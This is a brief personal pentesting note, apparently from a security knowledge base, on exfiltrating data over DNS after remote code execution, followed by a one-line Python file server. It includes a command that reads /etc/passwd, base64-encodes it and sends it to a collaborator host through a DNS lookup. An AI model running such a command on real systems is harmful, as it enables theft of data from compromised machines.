# Exfiltration
Tags: #dns #firewall #waf
Related to: [[DNS]]
See also:
Previous:

## Links

## Notes
### DNS exfiltration when HTTP blocked
If you are able to do RCE on a target but can't exfil over HTTP:
- read content from file
- Use head to get a line
- b64 encode (or hex, or anything that's URL-safe)
- Make a DNS request to collaborator or a server you control

Example:
`EXFIL=$(cat /etc/passwd | head 1 | base64); curl $EXFIL.collaborator.com`

### Python simple server
This will open up port `1337` and serve the contents of the current directory.

_Note: bots will find you within a few minutes so don't put anything important here,
or else encrypt it securely._
`python3 -m http.server 1337`